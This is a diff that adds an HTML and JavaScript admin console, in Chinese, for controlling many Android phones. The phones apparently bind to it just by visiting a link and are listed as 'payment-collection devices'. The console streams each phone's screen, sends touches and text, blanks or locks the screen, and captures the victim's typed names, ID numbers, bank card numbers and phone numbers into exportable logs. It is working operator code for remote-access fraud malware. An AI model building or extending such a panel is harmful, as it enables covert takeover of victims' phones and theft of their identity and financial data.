@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>多设备远程控制-管理端</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{padding:12px}
+.login-box{max-width:360px;margin:30px auto;text-align:center}
+.login-input{width:90%;padding:12px;margin:8px 0;border:1px #ddd solid;border-radius:6px}
+#loginBtn{padding:12px 24px;background:#007aff;color:#fff;border:none;border-radius:6px}
+.main-wrap{display:none}
+.box{text-align:center;margin:15px 0}
+#screen{max-width:95%;border:2px #007aff solid;border-radius:8px}
+.btn-group{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin:12px 0}
+button{padding:9px 14px;border:none;border-radius:6px;font-size:14px}
+.btn-dark{background:#333;color:#fff}
+.btn-blue{background:#007aff;color:#fff}
+.btn-red{background:#ff3b30;color:#fff}
+.btn-gray{background:#eee;color:#333}
+#deviceList{text-align:left;border:1px #eee solid;padding:10px;border-radius:8px;margin:15px 0}
+.dev-item{padding:8px;border-bottom:1px #eee;display:flex;flex-wrap:wrap;gap:6px;align-items:center}
+.dev-name-input{width:110px;padding:6px;border:1px #ddd solid;border-radius:4px}
+#pwdBox{background:#f5f5f5;padding:10px;border-radius:6px;margin:10px 0}
+#textInput{width:95%;padding:10px;border:1px #ddd solid;border-radius:6px}
+h3{margin:10px 0}
+.tip{color:#666;font-size:13px}
+.log-box{max-height:220px;overflow-y:auto;border:1px #eee solid;padding:10px;margin:15px 0}
+.account-manage{border:1px #007aff solid;padding:12px;border-radius:8px;margin:20px 0}
+/* 个人资料头像面板 */
+.self-info{border:1px #22bb55 solid;padding:12px;border-radius:8px;margin-bottom:15px}
+.avatar-preview{width:80px;height:80px;border-radius:50%;object-fit:cover;border:1px #ccc solid;margin:8px auto}
+.file-input{display:none}
+</style>
+</head>
+<body>
+<!-- 登录面板（账号+密码双输入） -->
+<div class="login-box" id="loginPanel">
+  <h3>系统登录验证</h3>
+  <input class="login-input" id="username" placeholder="输入登录账号">
+  <input class="login-input" id="loginPwd" type="password" placeholder="输入登录密码">
+  <br>
+  <button id="loginBtn" onclick="login()">登录系统</button>
+</div>
+
+<!-- 登录后主界面 -->
+<div class="main-wrap" id="mainPanel">
+  <h3 style="text-align:center">当前登录用户：<span id="nowUser"></span> 【<span id="userRole"></span>】</h3>
+
+  <!-- 全部账号通用：个人资料（头像上传+自主修改密码） -->
+  <div class="self-info">
+    <h3>个人资料设置（所有人均可操作）</h3>
+    <div style="text-align:center">
+      <img id="avatarPreview" class="avatar-preview" src="" alt="头像">
+      <input type="file" id="avatarFile" accept="image/*" class="file-input">
+      <button class="btn-blue" onclick="document.getElementById('avatarFile').click()">选择头像图片</button>
+      <button class="btn-dark" onclick="uploadAvatar()">确认上传头像</button>
+    </div>
+    <div style="margin-top:10px">
+      <input class="login-input" id="oldSelfPwd" placeholder="输入当前登录密码" type="password">
+      <input class="login-input" id="newSelfPwd" placeholder="设置新登录密码" type="password">
+      <button class="btn-red" onclick="editSelfPassword()">修改个人登录密码</button>
+    </div>
+  </div>
+
+  <!-- 仅主管理员可见：账号管理面板（新增/删除他人账号、改他人密码） -->
+  <div class="account-manage" id="accPanel" style="display:none">
+    <h3>主管理员专属：子账号管理（仅admin可见）</h3>
+    <div style="margin:10px 0">
+        <input class="login-input" id="newAccName" placeholder="新增子账号名称">
+        <input class="login-input" id="newAccPwd" placeholder="子账号初始密码">
+        <button class="btn-blue" onclick="addSubAccount()">新增子账号</button>
+    </div>
+    <div id="devWrapAcc"></div>
+  </div>
+
+  <!-- 已绑定收款设备列表 -->
+  <div id="deviceList">
+    <h3>已绑定收款设备列表（安卓访问链接自动绑定）</h3>
+    <div id="devWrap"></div>
+  </div>
+
+  <!-- 远程控制功能按钮 -->
+  <div class="btn-group">
+    <button class="btn-dark" onclick="sendScreenOff()">安卓黑屏后台待机</button>
+    <button class="btn-blue" onclick="sendScreenOn()">恢复屏幕亮显</button>
+    <button class="btn-red" onclick="lockDevice()">远程锁定安卓屏幕</button>
+    <button class="btn-gray" onclick="exportLog()">导出全部捕获日志</button>
+  </div>
+
+  <!-- 实时输入捕获面板 -->
+  <div id="pwdBox">
+    <h4>被控设备实时输入捕获（姓名/身份证/卡号/手机号）</h4>
+    <div id="pwdContent">暂无捕获信息</div>
+  </div>
+
+  <!-- 历史操作日志 -->
+  <div class="log-box">
+    <h4>全量操作记录日志</h4>
+    <div id="logWrap"></div>
+  </div>
+
+  <!-- 实时屏幕画面区域 -->
+  <div class="box">
+    <h3>选中设备实时画面（点击画面直接操控）</h3>
+    <img id="screen" />
+    <input id="textInput" placeholder="输入文字/密码下发至被控手机" onkeyup="sendInput(event)">
+  </div>
+</div>
+
+<script>
+let ws = null;
+let currentDevId = null;
+let loginUserInfo = null;
+const loginPanel = document.getElementById('loginPanel');
+const mainPanel = document.getElementById('mainPanel');
+const accPanel = document.getElementById('accPanel');
+const nowUser = document.getElementById('nowUser');
+const userRole = document.getElementById('userRole');
+const screen = document.getElementById('screen');
+const devWrap = document.getElementById('devWrap');
+const devWrapAcc = document.getElementById('devWrapAcc');
+const pwdContent = document.getElementById('pwdContent');
+const logWrap = document.getElementById('logWrap');
+const textInput = document.getElementById('textInput');
+const newAccName = document.getElementById('newAccName');
+const newAccPwd = document.getElementById('newAccPwd');
+const avatarPreview = document.getElementById('avatarPreview');
+const avatarFile = document.getElementById('avatarFile');
+
+// 登录
+async function login(){
+  const username = document.getElementById('username').value.trim();
+  const pwd = document.getElementById('loginPwd').value.trim();
+  if(!username || !pwd) return alert("请填写账号与密码");
+  const res = await fetch("/api/login",{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({username,pwd})
+  });
+  const ret = await res.json();
+  if(ret.code === 200){
+    loginPanel.style.display = "none";
+    mainPanel.style.display = "block";
+    loginUserInfo = ret.user;
+    nowUser.innerText = loginUserInfo.username;
+    userRole.innerText = loginUserInfo.role === "master" ? "主管理员" : "子操作员";
+    // 加载头像
+    if(loginUserInfo.avatar) avatarPreview.src = loginUserInfo.avatar;
+    // 仅主账号展示他人账号管理面板
+    if(loginUserInfo.role === "master"){
+        accPanel.style.display = "block";
+        loadAllAccount();
+    }
+    initWs();
+  }else alert(ret.msg);
+}
+
+// 1. 全账号通用：上传个人头像
+async function uploadAvatar(){
+  const file = avatarFile.files[0];
+  if(!file) return alert("请先选择图片");
+  const formData = new FormData();
+  formData.append('avatar', file);
+  const res = await fetch("/api/uploadAvatar",{method:"POST",body:formData});
+  const ret = await res.json();
+  if(ret.code === 200){
+    avatarPreview.src = ret.avatar;
+    alert("头像上传成功");
+  }else alert(ret.msg);
+}
+
+// 2. 全账号通用：修改自己密码
+async function editSelfPassword(){
+  const old = document.getElementById('oldSelfPwd').value.trim();
+  const newP = document.getElementById('newSelfPwd').value.trim();
+  if(!old || !newP) return alert("填写原密码和新密码");
+  const res = await fetch("/api/editSelfPwd",{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({oldPwd:old,newPwd:newP})
+  });
+  const ret = await res.json();
+  if(ret.code === 200){
+    alert(ret.msg);
+    document.getElementById('oldSelfPwd').value = "";
+    document.getElementById('newSelfPwd').value = "";
+  }else alert(ret.msg);
+}
+
+// 主账号专用：加载全部账号列表（管理他人）
+async function loadAllAccount(){
+  const res = await fetch("/api/getAllAccount");
+  const data = await res.json();
+  devWrapAcc.innerHTML = "";
+  data.list.forEach(acc=>{
+    const div = document.createElement('div');
+    div.style.padding = "6px 0";
+    div.style.display = "flex";
+    div.style.gap = "6px";
+    div.style.alignItems = "center";
+    div.style.borderBottom = "1px #eee solid";
+    div.innerHTML = `
+        <span>账号：${acc.username} | ${acc.role==='master'?'主账号':'子账号'} | 创建时间：${acc.createTime}</span>
+        ${acc.role !== "master" ? `
+            <input class="login-input" placeholder="新密码" id="editOtherPwd_${acc.username}">
+            <button onclick="changeOtherPwd('${acc.username}')">修改此账号密码</button>
+            <button class="btn-red" onclick="delAcc('${acc.username}')">删除此账号</button>
+        `:"<span style='color:#007aff'>主账号禁止删除</span>"}
+    `;
+    devWrapAcc.appendChild(div);
+  })
+}
+
+// 主账号：新增子账号
+async function addSubAccount(){
+  const un = newAccName.value.trim();
+  const pd = newAccPwd.value.trim();
+  if(!un || !pd) return alert("填写账号名称与初始密码");
+  const res = await fetch("/api/addSubAccount",{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({username:un,pwd:pd})
+  });
+  const ret = await res.json();
+  if(ret.code === 200){
+    newAccName.value = "";
+    newAccPwd.value = "";
+    loadAllAccount();
+    alert("子账号新增成功");
+  }else alert(ret.msg);
+}
+
+// 主账号：修改其他子账号密码
+async function changeOtherPwd(username){
+  const input = document.getElementById(`editOtherPwd_${username}`);
+  const newPwd = input.value.trim();
+  if(!newPwd) return alert("输入新密码");
+  const res = await fetch("/api/editOtherPwd",{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({username,newPwd})
+  });
+  const ret = await res.json();
+  if(ret.code === 200){
+    loadAllAccount();
+    alert("目标账号密码修改完成");
+  }else alert(ret.msg);
+}
+
+// 主账号：删除其他子账号
+async function delAcc(username){
+  if(!confirm(`确认永久删除账号【${username}】？`)) return;
+  const res = await fetch("/api/delAccount",{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({username})
+  });
+  const ret = await res.json();
+  if(ret.code === 200){
+    loadAllAccount();
+    alert("账号已删除");
+  }else alert(ret.msg);
+}
+
+// WebSocket连接
+function initWs(){
+  ws = new WebSocket(`ws://${location.host}`);
+  ws.onopen = () => ws.send(JSON.stringify({type:'controlClient'}));
+  ws.onmessage = e => {
+    const msg = JSON.parse(e.data);
+    if(msg.type === 'deviceList'){
+      devWrap.innerHTML = '';
+      msg.list.forEach(dev => {
+        const item = document.createElement('div');
+        item.className = 'dev-item';
+        item.innerHTML = `
+          <span>设备ID:${dev.id.slice(0,8)} | ${dev.online?'在线':'离线'} | 绑定时间：${dev.bindTime}</span>
+          <input class="dev-name-input" value="${dev.name}" onblur="saveDevName('${dev.id}',this.value)">
+          <button onclick="switchDev('${dev.id}')">切换控制</button>
+          <button class="btn-red" onclick="delDev('${dev.id}')">永久解绑删除</button>
+        `;
+        devWrap.appendChild(item);
+      });
+      return;
+    }
+    if(msg.type === 'devStream' && msg.devId === currentDevId){
+      screen.src = msg.img;
+    }
+    if(msg.type === 'inputCapture'){
+      pwdContent.innerText = `捕获文本：${msg.text}`;
+      logWrap.innerHTML = `<div>${new Date().toLocaleString()} 操作人【${msg.operator}】捕获输入：${msg.text}</div>` + logWrap.innerHTML;
+    }
+  };
+}
+
+// 设备操作
+function switchDev(devId){
+  currentDevId = devId;
+  alert(`已切换至目标设备，ID前缀：${devId.slice(0,8)}`);
+}
+async function saveDevName(devId,name){
+  await fetch("/api/editDevName",{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({devId,name})
+  });
+}
+async function delDev(devId){
+  if(!confirm("确认永久解绑该收款设备，解绑后无法自动恢复？")) return;
+  await fetch("/api/delDevice",{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({devId})
+  });
+}
+
+// 远程控制指令
+function sendScreenOff(){
+  if(!currentDevId) return alert("请先在设备列表选中一台设备");
+  ws.send(JSON.stringify({type:'cmd', devId:currentDevId, action:'screenOff'}));
+}
+function sendScreenOn(){
+  if(!currentDevId) return alert("请先选中设备");
+  ws.send(JSON.stringify({type:'cmd', devId:currentDevId, action:'screenOn'}));
+}
+function lockDevice(){
+  if(!currentDevId) return alert("请先选中设备");
+  ws.send(JSON.stringify({type:'cmd', devId:currentDevId, action:'lockScreen'}));
+}
+
+// 画面点击操控
+screen.addEventListener('click', e => {
+  if(!currentDevId) return;
+  const rect = screen.getBoundingClientRect();
+  const x = (e.clientX - rect.left) / rect.width;
+  const y = (e.clientY - rect.top) / rect.height;
+  ws.send(JSON.stringify({type:'cmd', devId:currentDevId, action:'touch', x, y}));
+});
+
+// 下发文字输入
+function sendInput(e){
+  if(e.key !== 'Enter' || !textInput.value.trim() || !currentDevId) return;
+  ws.send(JSON.stringify({type:'cmd', devId:currentDevId, action:'inputText', content:textInput.value}));
+  textInput.value = '';
+}
+
+// 导出日志
+function exportLog(){
+  window.open("/api/exportLog");
+}
+</script>
+</body>
+</html>
